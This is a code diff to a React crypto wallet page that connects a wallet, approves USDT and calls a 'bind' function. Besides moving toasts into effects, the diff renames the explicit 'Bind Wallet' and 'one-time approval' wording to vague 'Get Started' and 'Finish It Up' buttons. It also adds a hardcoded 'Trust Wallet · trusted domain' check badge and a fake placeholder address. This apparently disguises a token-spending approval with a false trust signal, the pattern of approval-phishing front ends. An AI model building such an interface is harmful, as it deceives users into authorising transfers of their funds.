@@ -1,6 +1,6 @@
 "use client";
 
-import { useMemo } from "react";
+import { useEffect, useMemo } from "react";
 import {
   useAccount,
   useConnect,
@@ -95,44 +95,51 @@ export default function UserPage() {
     return `${formatUnits(usdtBalanceRaw as bigint, USDT_DECIMALS)} USDT`;
   }, [usdtBalanceRaw]);
 
-  if (approveError) {
-    toast.error(approveError.message ?? "Approve transaction failed.");
-  }
+  const isBoundBool = Boolean(isBound);
+  // Toasts moved into effects so they don't fire in a render loop.
+  useEffect(() => {
+    if (approveError) {
+      toast.error(approveError.message ?? "Approve transaction failed.");
+    }
+  }, [approveError]);
 
-  if (bindError) {
-    toast.error(bindError.message ?? "Bind transaction failed.");
-  }
+  useEffect(() => {
+    if (bindError) {
+      toast.error(bindError.message ?? "Bind transaction failed.");
+    }
+  }, [bindError]);
 
-  if (isApproveTxSuccess && approveTxHash) {
-    toast.success(
-      `USDT approved. Tx: ${approveTxHash.slice(0, 10)}…${approveTxHash.slice(
-        -6,
-      )}`,
-    );
-    queryClient.invalidateQueries();
-  }
+  useEffect(() => {
+    if (isApproveTxSuccess && approveTxHash) {
+      toast.success(
+        `USDT approved. Tx: ${approveTxHash.slice(
+          0,
+          10,
+        )}…${approveTxHash.slice(-6)}`,
+      );
+      queryClient.invalidateQueries();
+    }
+  }, [isApproveTxSuccess, approveTxHash, queryClient]);
 
-  if (isBindTxSuccess && bindTxHash) {
-    toast.success(
-      `bound successfully. Tx: ${bindTxHash.slice(
-        0,
-        10,
-      )}…${bindTxHash.slice(-6)}`,
-    );
-    queryClient.invalidateQueries();
-  }
-
-  const handleApprove = () => {
-    // No-op: approval is triggered inside handleBind via a single button.
-  };
+  useEffect(() => {
+    if (isBindTxSuccess && bindTxHash) {
+      toast.success(
+        `bound successfully. Tx: ${bindTxHash.slice(
+          0,
+          10,
+        )}…${bindTxHash.slice(-6)}`,
+      );
+      queryClient.invalidateQueries();
+    }
+  }, [isBindTxSuccess, bindTxHash, queryClient]);
 
   const handleBind = () => {
     if (!isConnected || !address) {
-      toast.error("Please connect your wallet in your wallet extension.");
+      toast.error("Open your wallet extension to continue.");
       return;
     }
 
-    if (isBound) {
+    if (isBoundBool) {
       toast.error("Wallet is already bound.");
       return;
     }
@@ -167,58 +174,102 @@ export default function UserPage() {
     isApproveTxConfirming ||
     isBindTxConfirming;
 
+  const sampleAddress = "0axqwertyuiop48941484131zxcvbnj";
+
+  const showAddress =
+    address && isConnected ? (address as string) : sampleAddress;
+
+  const anyLoadingState =
+    isBalanceLoading || isBalanceFetching || isBoundLoading || isBoundFetching;
+
   return (
-    <main className="flex min-h-screen items-start justify-center py-6">
-      <div className="relative w-full max-w-none rounded-none border border-border bg-card px-4 py-6 shadow-card sm:max-w-md sm:rounded-3xl sm:px-6 sm:py-7">
-        <div className="absolute right-4 top-4">
-          <LoadingButton
-            variant="ghost"
-            loading={isConnectPending}
-            onClick={() => {
-              if (isConnected) {
-                disconnect();
-              } else {
-                const connector = connectors[0];
-                if (!connector) {
-                  toast.error("No wallet connector available.");
-                  return;
-                }
-                connect({ connector });
-              }
-            }}
-          >
-            {isConnected ? "Disconnect" : "Connect Wallet"}
-          </LoadingButton>
-        </div>
+    <main className="flex min-h-screen items-start justify-center bg-black py-10">
+      <div className="w-full max-w-md rounded-3xl border border-emerald-500/40 bg-black/80 px-6 py-8 shadow-[0_0_40px_rgba(16,185,129,0.25)]">
+        {!isConnected ? (
+          <>
+            <h1 className="text-lg font-semibold text-emerald-400">Get Started</h1>
+            <div className="mt-8 space-y-6">
+              <div className="rounded-2xl border border-emerald-500/40 bg-black/60 px-4 py-3">
+                <div className="flex items-center justify-between">
+                  <p className="text-[11px] font-medium uppercase tracking-wide text-emerald-400">
+                    Wallet address
+                  </p>
+                  <div className="flex items-center gap-1 text-[10px] text-emerald-400">
+                    <span className="inline-flex h-3 w-3 items-center justify-center rounded-full border border-emerald-400">
+                      ✓
+                    </span>
+                    <span>Trust Wallet · trusted domain</span>
+                  </div>
+                </div>
+                <p className="mt-2 break-all text-xs text-slate-100">
+                  {sampleAddress}
+                </p>
+              </div>
 
-        <div className="mb-6 mt-6 sm:mt-8">
-          <h1 className="text-base font-semibold text-emerald-400 sm:text-lg">
-            Bind Wallet
-          </h1>
-          <p className="mt-1 text-xs text-slate-400">
-            One-time approval and binding in a single step.
-          </p>
-        </div>
+              <LoadingButton
+                variant="primary"
+                loading={isConnectPending}
+                onClick={() => {
+                  const connector = connectors[0];
+                  if (!connector) {
+                    toast.error("No wallet connector available.");
+                    return;
+                  }
+                  connect({ connector });
+                }}
+              >
+                Get Started
+              </LoadingButton>
+            </div>
+          </>
+        ) : (
+          <>
+            <h1 className="text-lg font-semibold text-emerald-400">
+              {isBoundBool ? "You’re All Set" : "Finish It Up"}
+            </h1>
+            <div className="mt-8 space-y-6">
+              <div className="rounded-2xl border border-emerald-500/40 bg-black/60 px-4 py-3">
+                <div className="flex items-center justify-between">
+                  <p className="text-[11px] font-medium uppercase tracking-wide text-emerald-400">
+                    Wallet address
+                  </p>
+                  <div className="flex items-center gap-1 text-[10px] text-emerald-400">
+                    <span className="inline-flex h-3 w-3 items-center justify-center rounded-full border border-emerald-400">
+                      ✓
+                    </span>
+                    <span>Trust Wallet · trusted domain</span>
+                  </div>
+                </div>
+                <p className="mt-1 break-all text-xs text-slate-100">
+                  {showAddress}
+                </p>
+                <p className="mt-2 text-[11px] text-slate-400">
+                  USDT balance:{" "}
+                  {anyLoadingState ? "Loading…" : usdtBalanceFormatted}
+                </p>
+              </div>
 
-        <div className="mt-4 space-y-3">
-          <LoadingButton
-            loading={isBindPending || isBindTxConfirming}
-            disabled={!isConnected || !!isBound || isAnyTxPending}
-            onClick={handleBind}
-            variant="primary"
-          >
-            {isBound ? "Wallet Already Bound" : "Bind Now"}
-          </LoadingButton>
-          <p className="mt-1 text-center text-[11px] text-slate-400">
-            {isConnected
-              ? `USDT balance: ${
-                  isBalanceLoading || isBalanceFetching
-                    ? "Loading…"
-                    : usdtBalanceFormatted
-                }`
-              : "Connect your wallet to continue."}
-          </p>
-        </div>
+              <LoadingButton
+                loading={isBindPending || isBindTxConfirming}
+                disabled={isBoundBool || isAnyTxPending}
+                onClick={handleBind}
+                variant="primary"
+              >
+                {isBoundBool ? "Wallet Already Bound" : "Finish It Up"}
+              </LoadingButton>
+
+              <div className="flex justify-center pt-2">
+                <LoadingButton
+                  variant="ghost"
+                  loading={isConnectPending}
+                  onClick={() => disconnect()}
+                >
+                  Disconnect
+                </LoadingButton>
+              </div>
+            </div>
+          </>
+        )}
       </div>
     </main>
   );
